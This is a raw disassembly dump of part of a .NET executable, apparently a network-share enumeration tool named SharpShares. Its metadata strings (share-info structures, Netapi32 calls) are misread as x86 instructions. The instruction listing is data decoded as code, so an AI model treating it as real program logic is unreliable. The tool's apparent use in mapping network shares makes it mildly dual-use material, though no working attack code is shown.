  403165:	65 74 41             	gs je  0x4031a9
  403168:	6c                   	insb   (%dx),%es:(%edi)
  403169:	6c                   	insb   (%dx),%es:(%edi)
  40316a:	53                   	push   %ebx
  40316b:	68 61 72 65 73       	push   $0x73657261
  403170:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  403174:	30 00                	xor    %al,(%eax)
  403176:	3c 3e                	cmp    $0x3e,%al
  403178:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40317b:	44                   	inc    %esp
  40317c:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  403183:	6c                   	insb   (%dx),%es:(%edi)
  403184:	61                   	popa
  403185:	73 73                	jae    0x4031fa
  403187:	31 39                	xor    %edi,(%ecx)
  403189:	5f                   	pop    %edi
  40318a:	31 00                	xor    %eax,(%eax)
  40318c:	53                   	push   %ebx
  40318d:	48                   	dec    %eax
  40318e:	41                   	inc    %ecx
  40318f:	52                   	push   %edx
  403190:	45                   	inc    %ebp
  403191:	5f                   	pop    %edi
  403192:	49                   	dec    %ecx
  403193:	4e                   	dec    %esi
  403194:	46                   	inc    %esi
  403195:	4f                   	dec    %edi
  403196:	5f                   	pop    %edi
  403197:	31 00                	xor    %eax,(%eax)
  403199:	49                   	dec    %ecx
  40319a:	45                   	inc    %ebp
  40319b:	6e                   	outsb  %ds:(%esi),(%dx)
  40319c:	75 6d                	jne    0x40320b
  40319e:	65 72 61             	gs jb  0x403202
  4031a1:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4031a5:	31 00                	xor    %eax,(%eax)
  4031a7:	4c                   	dec    %esp
  4031a8:	69 73 74 60 31 00 43 	imul   $0x43003160,0x74(%ebx),%esi
  4031af:	53                   	push   %ebx
  4031b0:	24 3c                	and    $0x3c,%al
  4031b2:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  4031b6:	6c                   	insb   (%dx),%es:(%edi)
  4031b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4031b8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4031bb:	73 31                	jae    0x4031ee
  4031bd:	00 49 6e             	add    %cl,0x6e(%ecx)
  4031c0:	74 33                	je     0x4031f5
  4031c2:	32 00                	xor    (%eax),%al
  4031c4:	3c 4d                	cmp    $0x4d,%al
  4031c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c7:	64 75 6c             	fs jne 0x403236
  4031ca:	65 3e 00 53 54       	gs add %dl,%ds:0x54(%ebx)
  4031cf:	59                   	pop    %ecx
  4031d0:	50                   	push   %eax
  4031d1:	45                   	inc    %ebp
  4031d2:	5f                   	pop    %edi
  4031d3:	49                   	dec    %ecx
  4031d4:	50                   	push   %eax
  4031d5:	43                   	inc    %ebx
  4031d6:	00 53 54             	add    %dl,0x54(%ebx)
  4031d9:	59                   	pop    %ecx
  4031da:	50                   	push   %eax
  4031db:	45                   	inc    %ebp
  4031dc:	5f                   	pop    %edi
  4031dd:	44                   	inc    %esp
  4031de:	45                   	inc    %ebp
  4031df:	56                   	push   %esi
  4031e0:	49                   	dec    %ecx
  4031e1:	43                   	inc    %ebx
  4031e2:	45                   	inc    %ebp
  4031e3:	00 53 54             	add    %dl,0x54(%ebx)
  4031e6:	59                   	pop    %ecx
  4031e7:	50                   	push   %eax
  4031e8:	45                   	inc    %ebp
  4031e9:	5f                   	pop    %edi
  4031ea:	44                   	inc    %esp
  4031eb:	49                   	dec    %ecx
  4031ec:	53                   	push   %ebx
  4031ed:	4b                   	dec    %ebx
  4031ee:	54                   	push   %esp
  4031ef:	52                   	push   %edx
  4031f0:	45                   	inc    %ebp
  4031f1:	45                   	inc    %ebp
  4031f2:	00 53 48             	add    %dl,0x48(%ebx)
  4031f5:	41                   	inc    %ecx
  4031f6:	52                   	push   %edx
  4031f7:	45                   	inc    %ebp
  4031f8:	5f                   	pop    %edi
  4031f9:	54                   	push   %esp
  4031fa:	59                   	pop    %ecx
  4031fb:	50                   	push   %eax
  4031fc:	45                   	inc    %ebp
  4031fd:	00 4e 45             	add    %cl,0x45(%esi)
  403200:	52                   	push   %edx
  403201:	52                   	push   %edx
  403202:	5f                   	pop    %edi
  403203:	42                   	inc    %edx
  403204:	41                   	inc    %ecx
  403205:	53                   	push   %ebx
  403206:	45                   	inc    %ebp
  403207:	00 4d 41             	add    %cl,0x41(%ebp)
  40320a:	58                   	pop    %eax
  40320b:	5f                   	pop    %edi
  40320c:	50                   	push   %eax
  40320d:	52                   	push   %edx
  40320e:	45                   	inc    %ebp
  40320f:	46                   	inc    %esi
  403210:	45                   	inc    %ebp
  403211:	52                   	push   %edx
  403212:	52                   	push   %edx
  403213:	45                   	inc    %ebp
  403214:	44                   	inc    %esp
  403215:	5f                   	pop    %edi
  403216:	4c                   	dec    %esp
  403217:	45                   	inc    %ebp
  403218:	4e                   	dec    %esi
  403219:	47                   	inc    %edi
  40321a:	54                   	push   %esp
  40321b:	48                   	dec    %eax
  40321c:	00 53 54             	add    %dl,0x54(%ebx)
  40321f:	59                   	pop    %ecx
  403220:	50                   	push   %eax
  403221:	45                   	inc    %ebp
  403222:	5f                   	pop    %edi
  403223:	53                   	push   %ebx
  403224:	50                   	push   %eax
  403225:	45                   	inc    %ebp
  403226:	43                   	inc    %ebx
  403227:	49                   	dec    %ecx
  403228:	41                   	inc    %ecx
  403229:	4c                   	dec    %esp
  40322a:	00 53 79             	add    %dl,0x79(%ebx)
  40322d:	73 74                	jae    0x4032a3
  40322f:	65 6d                	gs insl (%dx),%es:(%edi)
  403231:	2e 49                	cs dec %ecx
  403233:	4f                   	dec    %edi
  403234:	00 53 54             	add    %dl,0x54(%ebx)
  403237:	59                   	pop    %ecx
  403238:	50                   	push   %eax
  403239:	45                   	inc    %ebp
  40323a:	5f                   	pop    %edi
  40323b:	50                   	push   %eax
  40323c:	52                   	push   %edx
  40323d:	49                   	dec    %ecx
  40323e:	4e                   	dec    %esi
  40323f:	54                   	push   %esp
  403240:	51                   	push   %ecx
  403241:	00 76 61             	add    %dh,0x61(%esi)
  403244:	6c                   	insb   (%dx),%es:(%edi)
  403245:	75 65                	jne    0x4032ac
  403247:	5f                   	pop    %edi
  403248:	5f                   	pop    %edi
  403249:	00 6d 73             	add    %ch,0x73(%ebp)
  40324c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40324f:	6c                   	insb   (%dx),%es:(%edi)
  403250:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  403257:	65 6d                	gs insl (%dx),%es:(%edi)
  403259:	2e 43                	cs inc %ebx
  40325b:	6f                   	outsl  %ds:(%esi),(%dx)
  40325c:	6c                   	insb   (%dx),%es:(%edi)
  40325d:	6c                   	insb   (%dx),%es:(%edi)
  40325e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403263:	6e                   	outsb  %ds:(%esi),(%dx)
  403264:	73 2e                	jae    0x403294
  403266:	47                   	inc    %edi
  403267:	65 6e                	outsb  %gs:(%esi),(%dx)
  403269:	65 72 69             	gs jb  0x4032d5
  40326c:	63 00                	arpl   %eax,(%eax)
  40326e:	54                   	push   %esp
  40326f:	68 72 65 61 64       	push   $0x64616572
  403274:	00 65 6e             	add    %ah,0x6e(%ebp)
  403277:	74 72                	je     0x4032eb
  403279:	69 65 73 72 65 61 64 	imul   $0x64616572,0x73(%ebp),%esp
  403280:	00 67 65             	add    %ah,0x65(%edi)
  403283:	74 5f                	je     0x4032e4
  403285:	50                   	push   %eax
  403286:	72 6f                	jb     0x4032f7
  403288:	70 65                	jo     0x4032ef
  40328a:	72 74                	jb     0x403300
  40328c:	69 65 73 54 6f 4c 6f 	imul   $0x6f4c6f54,0x73(%ebp),%esp
  403293:	61                   	popa
  403294:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  403298:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  40329c:	73 74                	jae    0x403312
  40329e:	65 6d                	gs insl (%dx),%es:(%edi)
  4032a0:	2e 43                	cs inc %ebx
  4032a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4032a3:	6c                   	insb   (%dx),%es:(%edi)
  4032a4:	6c                   	insb   (%dx),%es:(%edi)
  4032a5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4032aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4032ab:	73 2e                	jae    0x4032db
  4032ad:	53                   	push   %ebx
  4032ae:	70 65                	jo     0x403315
  4032b0:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4032b3:	6c                   	insb   (%dx),%es:(%edi)
  4032b4:	69 7a 65 64 00 70 6c 	imul   $0x6c700064,0x65(%edx),%edi
  4032bb:	61                   	popa
  4032bc:	74 66                	je     0x403324
  4032be:	6f                   	outsl  %ds:(%esi),(%dx)
  4032bf:	72 6d                	jb     0x40332e
  4032c1:	5f                   	pop    %edi
  4032c2:	69 64 00 3c 4d 61 78 	imul   $0x5478614d,0x3c(%eax,%eax,1),%esp
  4032c9:	54 
  4032ca:	68 72 65 61 64       	push   $0x64616572
  4032cf:	73 3e                	jae    0x40330f
  4032d1:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4032d5:	61                   	popa
  4032d6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4032d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4032da:	67 46                	addr16 inc %esi
  4032dc:	69 65 6c 64 00 4e 65 	imul   $0x654e0064,0x6c(%ebp),%esp
  4032e3:	74 41                	je     0x403326
  4032e5:	70 69                	jo     0x403350
  4032e7:	42                   	inc    %edx
  4032e8:	75 66                	jne    0x403350
  4032ea:	66 65 72 46          	data16 gs jb 0x403334
  4032ee:	72 65                	jb     0x403355
  4032f0:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  4032f4:	75 6d                	jne    0x403363
  4032f6:	65 72 61             	gs jb  0x40335a
  4032f9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4032fd:	49                   	dec    %ecx
  4032fe:	44                   	inc    %esp
  4032ff:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  403306:	6c                   	insb   (%dx),%es:(%edi)
  403307:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40330b:	6e                   	outsb  %ds:(%esi),(%dx)
  40330c:	74 69                	je     0x403377
  40330e:	6d                   	insl   (%dx),%es:(%edi)
  40330f:	65 54                	gs push %esp
  403311:	79 70                	jns    0x403383
  403313:	65 48                	gs dec %eax
  403315:	61                   	popa
  403316:	6e                   	outsb  %ds:(%esi),(%dx)
  403317:	64 6c                	fs insb (%dx),%es:(%edi)
  403319:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40331d:	74 54                	je     0x403373
  40331f:	79 70                	jns    0x403391
  403321:	65 46                	gs inc %esi
  403323:	72 6f                	jb     0x403394
  403325:	6d                   	insl   (%dx),%es:(%edi)
  403326:	48                   	dec    %eax
  403327:	61                   	popa
  403328:	6e                   	outsb  %ds:(%esi),(%dx)
  403329:	64 6c                	fs insb (%dx),%es:(%edi)
  40332b:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  40332f:	73 75                	jae    0x4033a6
  403331:	6d                   	insl   (%dx),%es:(%edi)
  403332:	65 5f                	gs pop %edi
  403334:	68 61 6e 64 6c       	push   $0x6c646e61
  403339:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40333d:	6e                   	outsb  %ds:(%esi),(%dx)
  40333e:	73 6f                	jae    0x4033af
  403340:	6c                   	insb   (%dx),%es:(%edi)
  403341:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  403345:	74 5f                	je     0x4033a6
  403347:	4e                   	dec    %esi
  403348:	61                   	popa
  403349:	6d                   	insl   (%dx),%es:(%edi)
  40334a:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  40334e:	72 76                	jb     0x4033c6
  403350:	65 72 4e             	gs jb  0x4033a1
  403353:	61                   	popa
  403354:	6d                   	insl   (%dx),%es:(%edi)
  403355:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  403359:	6d                   	insl   (%dx),%es:(%edi)
  40335a:	70 75                	jo     0x4033d1
  40335c:	74 65                	je     0x4033c3
  40335e:	72 5f                	jb     0x4033bf
  403360:	6e                   	outsb  %ds:(%esi),(%dx)
  403361:	61                   	popa
  403362:	6d                   	insl   (%dx),%es:(%edi)
  403363:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  403367:	61                   	popa
  403368:	72 65                	jb     0x4033cf
  40336a:	6e                   	outsb  %ds:(%esi),(%dx)
  40336b:	61                   	popa
  40336c:	6d                   	insl   (%dx),%es:(%edi)
  40336d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  403371:	72 76                	jb     0x4033e9
  403373:	65 72 6e             	gs jb  0x4033e4
  403376:	61                   	popa
  403377:	6d                   	insl   (%dx),%es:(%edi)
  403378:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  40337c:	69 30 5f 6e 65 74    	imul   $0x74656e5f,(%eax),%esi
  403382:	6e                   	outsb  %ds:(%esi),(%dx)
  403383:	61                   	popa
  403384:	6d                   	insl   (%dx),%es:(%edi)
  403385:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  403389:	69 31 5f 6e 65 74    	imul   $0x74656e5f,(%ecx),%esi
  40338f:	6e                   	outsb  %ds:(%esi),(%dx)
  403390:	61                   	popa
  403391:	6d                   	insl   (%dx),%es:(%edi)
  403392:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  403396:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  40339d:	00 
  40339e:	56                   	push   %esi
  40339f:	61                   	popa
  4033a0:	6c                   	insb   (%dx),%es:(%edi)
  4033a1:	75 65                	jne    0x403408
  4033a3:	54                   	push   %esp
  4033a4:	79 70                	jns    0x403416
  4033a6:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  4033aa:	69 31 5f 74 79 70    	imul   $0x7079745f,(%ecx),%esi
  4033b0:	65 00 73 68          	add    %dh,%gs:0x68(%ebx)
  4033b4:	61                   	popa
  4033b5:	72 65                	jb     0x40341c
  4033b7:	74 79                	je     0x403432
  4033b9:	70 65                	jo     0x403420
  4033bb:	00 4e 45             	add    %cl,0x45(%esi)
  4033be:	52                   	push   %edx
  4033bf:	52                   	push   %edx
  4033c0:	5f                   	pop    %edi
  4033c1:	44                   	inc    %esp
  4033c2:	75 70                	jne    0x403434
  4033c4:	6c                   	insb   (%dx),%es:(%edi)
  4033c5:	69 63 61 74 65 53 68 	imul   $0x68536574,0x61(%ebx),%esp
  4033cc:	61                   	popa
  4033cd:	72 65                	jb     0x403434
  4033cf:	00 53 79             	add    %dl,0x79(%ebx)
  4033d2:	73 74                	jae    0x403448
  4033d4:	65 6d                	gs insl (%dx),%es:(%edi)
  4033d6:	2e 43                	cs inc %ebx
  4033d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d9:	72 65                	jb     0x403440
  4033db:	00 53 65             	add    %dl,0x65(%ebx)
  4033de:	6d                   	insl   (%dx),%es:(%edi)
  4033df:	61                   	popa
  4033e0:	70 68                	jo     0x40344a
  4033e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e3:	72 65                	jb     0x40344a
  4033e5:	00 50 74             	add    %dl,0x74(%eax)
  4033e8:	72 54                	jb     0x40343e
  4033ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4033eb:	53                   	push   %ebx
  4033ec:	74 72                	je     0x403460
  4033ee:	75 63                	jne    0x403453
  4033f0:	74 75                	je     0x403467
  4033f2:	72 65                	jb     0x403459
  4033f4:	00 52 65             	add    %dl,0x65(%edx)
  4033f7:	61                   	popa
  4033f8:	64 4f                	fs dec %edi
  4033fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4033fb:	6c                   	insb   (%dx),%es:(%edi)
  4033fc:	79 43                	jns    0x403441
  4033fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ff:	6c                   	insb   (%dx),%es:(%edi)
  403400:	6c                   	insb   (%dx),%es:(%edi)
  403401:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403406:	6e                   	outsb  %ds:(%esi),(%dx)
  403407:	42                   	inc    %edx
  403408:	61                   	popa
  403409:	73 65                	jae    0x403470
  40340b:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40340f:	70 6f                	jo     0x403480
  403411:	73 65                	jae    0x403478
  403413:	00 43 6f             	add    %al,0x6f(%ebx)
  403416:	6d                   	insl   (%dx),%es:(%edi)
  403417:	70 69                	jo     0x403482
  403419:	6c                   	insb   (%dx),%es:(%edi)
  40341a:	65 72 47             	gs jb  0x403464
  40341d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40341f:	65 72 61             	gs jb  0x403483
  403422:	74 65                	je     0x403489
  403424:	64 41                	fs inc %ecx
  403426:	74 74                	je     0x40349c
  403428:	72 69                	jb     0x403493
  40342a:	62 75 74             	bound  %esi,0x74(%ebp)
  40342d:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  403431:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  403438:	62 
  403439:	75 74                	jne    0x4034af
  40343b:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403440:	75 67                	jne    0x4034a9
  403442:	67 61                	addr16 popa
  403444:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  403448:	74 74                	je     0x4034be
  40344a:	72 69                	jb     0x4034b5
  40344c:	62 75 74             	bound  %esi,0x74(%ebp)
  40344f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  403453:	6d                   	insl   (%dx),%es:(%edi)
  403454:	56                   	push   %esi
  403455:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40345c:	74 74                	je     0x4034d2
  40345e:	72 69                	jb     0x4034c9
  403460:	62 75 74             	bound  %esi,0x74(%ebp)
  403463:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403467:	73 65                	jae    0x4034ce
  403469:	6d                   	insl   (%dx),%es:(%edi)
  40346a:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40346e:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  403475:	72 
  403476:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40347d:	73 73                	jae    0x4034f2
  40347f:	65 6d                	gs insl (%dx),%es:(%edi)
  403481:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  403485:	72 61                	jb     0x4034e8
  403487:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40348a:	61                   	popa
  40348b:	72 6b                	jb     0x4034f8
  40348d:	41                   	inc    %ecx
  40348e:	74 74                	je     0x403504
  403490:	72 69                	jb     0x4034fb
  403492:	62 75 74             	bound  %esi,0x74(%ebp)
  403495:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40349a:	67 65 74 46          	addr16 gs je 0x4034e4
  40349e:	72 61                	jb     0x403501
  4034a0:	6d                   	insl   (%dx),%es:(%edi)
  4034a1:	65 77 6f             	gs ja  0x403513
  4034a4:	72 6b                	jb     0x403511
  4034a6:	41                   	inc    %ecx
  4034a7:	74 74                	je     0x40351d
  4034a9:	72 69                	jb     0x403514
  4034ab:	62 75 74             	bound  %esi,0x74(%ebp)
  4034ae:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4034b2:	73 65                	jae    0x403519
  4034b4:	6d                   	insl   (%dx),%es:(%edi)
  4034b5:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4034b9:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4034c0:	69 
  4034c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4034c3:	41                   	inc    %ecx
  4034c4:	74 74                	je     0x40353a
  4034c6:	72 69                	jb     0x403531
  4034c8:	62 75 74             	bound  %esi,0x74(%ebp)
  4034cb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4034cf:	73 65                	jae    0x403536
  4034d1:	6d                   	insl   (%dx),%es:(%edi)
  4034d2:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4034d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4034d8:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4034de:	74 69                	je     0x403549
  4034e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4034e2:	41                   	inc    %ecx
  4034e3:	74 74                	je     0x403559
  4034e5:	72 69                	jb     0x403550
  4034e7:	62 75 74             	bound  %esi,0x74(%ebp)
  4034ea:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4034ee:	73 65                	jae    0x403555
  4034f0:	6d                   	insl   (%dx),%es:(%edi)
  4034f1:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4034f5:	65 73 63             	gs jae 0x40355b
  4034f8:	72 69                	jb     0x403563
  4034fa:	70 74                	jo     0x403570
  4034fc:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  403503:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40350a:	6f                   	outsl  %ds:(%esi),(%dx)
  40350b:	6d                   	insl   (%dx),%es:(%edi)
  40350c:	70 69                	jo     0x403577
  40350e:	6c                   	insb   (%dx),%es:(%edi)
  40350f:	61                   	popa
  403510:	74 69                	je     0x40357b
  403512:	6f                   	outsl  %ds:(%esi),(%dx)
  403513:	6e                   	outsb  %ds:(%esi),(%dx)
  403514:	52                   	push   %edx
  403515:	65 6c                	gs insb (%dx),%es:(%edi)
  403517:	61                   	popa
  403518:	78 61                	js     0x40357b
  40351a:	74 69                	je     0x403585
  40351c:	6f                   	outsl  %ds:(%esi),(%dx)
  40351d:	6e                   	outsb  %ds:(%esi),(%dx)
  40351e:	73 41                	jae    0x403561
  403520:	74 74                	je     0x403596
  403522:	72 69                	jb     0x40358d
  403524:	62 75 74             	bound  %esi,0x74(%ebp)
  403527:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40352b:	73 65                	jae    0x403592
  40352d:	6d                   	insl   (%dx),%es:(%edi)
  40352e:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  403532:	72 6f                	jb     0x4035a3
  403534:	64 75 63             	fs jne 0x40359a
  403537:	74 41                	je     0x40357a
  403539:	74 74                	je     0x4035af
  40353b:	72 69                	jb     0x4035a6
  40353d:	62 75 74             	bound  %esi,0x74(%ebp)
  403540:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403544:	73 65                	jae    0x4035ab
  403546:	6d                   	insl   (%dx),%es:(%edi)
  403547:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40354b:	6f                   	outsl  %ds:(%esi),(%dx)
  40354c:	70 79                	jo     0x4035c7
  40354e:	72 69                	jb     0x4035b9
  403550:	67 68 74 41 74 74    	addr16 push $0x74744174
  403556:	72 69                	jb     0x4035c1
  403558:	62 75 74             	bound  %esi,0x74(%ebp)
  40355b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40355f:	73 65                	jae    0x4035c6
  403561:	6d                   	insl   (%dx),%es:(%edi)
  403562:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403566:	6f                   	outsl  %ds:(%esi),(%dx)
  403567:	6d                   	insl   (%dx),%es:(%edi)
  403568:	70 61                	jo     0x4035cb
  40356a:	6e                   	outsb  %ds:(%esi),(%dx)
  40356b:	79 41                	jns    0x4035ae
  40356d:	74 74                	je     0x4035e3
  40356f:	72 69                	jb     0x4035da
  403571:	62 75 74             	bound  %esi,0x74(%ebp)
  403574:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  403578:	6e                   	outsb  %ds:(%esi),(%dx)
  403579:	74 69                	je     0x4035e4
  40357b:	6d                   	insl   (%dx),%es:(%edi)
  40357c:	65 43                	gs inc %ebx
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	6d                   	insl   (%dx),%es:(%edi)
  403580:	70 61                	jo     0x4035e3
  403582:	74 69                	je     0x4035ed
  403584:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  403587:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40358e:	69 
  40358f:	62 75 74             	bound  %esi,0x74(%ebp)
  403592:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  403596:	6c                   	insb   (%dx),%es:(%edi)
  403597:	75 65                	jne    0x4035fe
  403599:	00 53 68             	add    %dl,0x68(%ebx)
  40359c:	61                   	popa
  40359d:	72 70                	jb     0x40360f
  40359f:	53                   	push   %ebx
  4035a0:	68 61 72 65 73       	push   $0x73657261
  4035a5:	2e 65 78 65          	cs js,pn 0x40360e
  4035a9:	00 73 65             	add    %dh,0x65(%ebx)
  4035ac:	74 5f                	je     0x40360d
  4035ae:	50                   	push   %eax
  4035af:	61                   	popa
  4035b0:	67 65 53             	addr16 gs push %ebx
  4035b3:	69 7a 65 00 53 69 7a 	imul   $0x7a695300,0x65(%edx),%edi
  4035ba:	65 4f                	gs dec %edi
  4035bc:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  4035c0:	73 74                	jae    0x403636
  4035c2:	65 6d                	gs insl (%dx),%es:(%edi)
  4035c4:	2e 54                	cs push %esp
  4035c6:	68 72 65 61 64       	push   $0x64616572
  4035cb:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4035d2:	74 65                	je     0x403639
  4035d4:	6d                   	insl   (%dx),%es:(%edi)
  4035d5:	2e 52                	cs push %edx
  4035d7:	75 6e                	jne    0x403647
  4035d9:	74 69                	je     0x403644
  4035db:	6d                   	insl   (%dx),%es:(%edi)
  4035dc:	65 2e 56             	gs cs push %esi
  4035df:	65 72 73             	gs jb  0x403655
  4035e2:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4035e9:	54                   	push   %esp
  4035ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4035eb:	53                   	push   %ebx
  4035ec:	74 72                	je     0x403660
  4035ee:	69 6e 67 00 73 68 69 	imul   $0x69687300,0x67(%esi),%ebp
  4035f5:	31 5f 72             	xor    %ebx,0x72(%edi)
  4035f8:	65 6d                	gs insl (%dx),%es:(%edi)
  4035fa:	61                   	popa
  4035fb:	72 6b                	jb     0x403668
  4035fd:	00 4d 61             	add    %cl,0x61(%ebp)
  403600:	72 73                	jb     0x403675
  403602:	68 61 6c 00 53       	push   $0x53006c61
  403607:	79 73                	jns    0x40367c
  403609:	74 65                	je     0x403670
  40360b:	6d                   	insl   (%dx),%es:(%edi)
  40360c:	2e 53                	cs push %ebx
  40360e:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  403612:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  403619:	6e 
  40361a:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40361d:	61                   	popa
  40361e:	6c                   	insb   (%dx),%es:(%edi)
  40361f:	00 6c 65 76          	add    %ch,0x76(%ebp,%eiz,2)
  403623:	65 6c                	gs insb (%dx),%es:(%edi)
  403625:	00 46 69             	add    %al,0x69(%esi)
  403628:	6e                   	outsb  %ds:(%esi),(%dx)
  403629:	64 41                	fs inc %ecx
  40362b:	6c                   	insb   (%dx),%es:(%edi)
  40362c:	6c                   	insb   (%dx),%es:(%edi)
  40362d:	00 4e 45             	add    %cl,0x45(%esi)
  403630:	52                   	push   %edx
  403631:	52                   	push   %edx
  403632:	5f                   	pop    %edi
  403633:	42                   	inc    %edx
  403634:	75 66                	jne    0x40369c
  403636:	54                   	push   %esp
  403637:	6f                   	outsl  %ds:(%esi),(%dx)
  403638:	6f                   	outsl  %ds:(%esi),(%dx)
  403639:	53                   	push   %ebx
  40363a:	6d                   	insl   (%dx),%es:(%edi)
  40363b:	61                   	popa
  40363c:	6c                   	insb   (%dx),%es:(%edi)
  40363d:	6c                   	insb   (%dx),%es:(%edi)
  40363e:	00 4e 65             	add    %cl,0x65(%esi)
  403641:	74 61                	je     0x4036a4
  403643:	70 69                	jo     0x4036ae
  403645:	33 32                	xor    (%edx),%esi
  403647:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40364a:	6c                   	insb   (%dx),%es:(%edi)
  40364b:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  40364f:	65 61                	gs popa
  403651:	64 50                	fs push %eax
  403653:	6f                   	outsl  %ds:(%esi),(%dx)
  403654:	6f                   	outsl  %ds:(%esi),(%dx)
  403655:	6c                   	insb   (%dx),%es:(%edi)
  403656:	00 50 72             	add    %dl,0x72(%eax)
  403659:	6f                   	outsl  %ds:(%esi),(%dx)
  40365a:	67 72 61             	addr16 jb 0x4036be
  40365d:	6d                   	insl   (%dx),%es:(%edi)
  40365e:	00 67 65             	add    %ah,0x65(%edi)
  403661:	74 5f                	je     0x4036c2
  403663:	49                   	dec    %ecx
  403664:	74 65                	je     0x4036cb
  403666:	6d                   	insl   (%dx),%es:(%edi)
  403667:	00 53 79             	add    %dl,0x79(%ebx)
  40366a:	73 74                	jae    0x4036e0
  40366c:	65 6d                	gs insl (%dx),%es:(%edi)
  40366e:	00 4e 65             	add    %cl,0x65(%esi)
